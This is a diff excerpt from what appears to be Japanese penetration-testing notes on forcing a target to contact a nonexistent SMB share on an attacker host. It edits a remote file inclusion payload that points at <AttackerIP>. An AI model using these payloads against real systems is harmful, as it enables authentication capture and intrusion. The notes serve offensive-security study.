@@ -368,7 +368,7 @@ dir \\<AttackerIP>\hoge
 
 ・方法B : WebアプリでRFIの脆弱性を利用して、ターゲットから攻撃者上の存在しないSMB共有にアクセスさせる
 ```sh
-http://example/page=http://<AttackerIP>/
+http://example/page=//<AttackerIP>/
 ```
 
 - 方法C：Webアプリでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
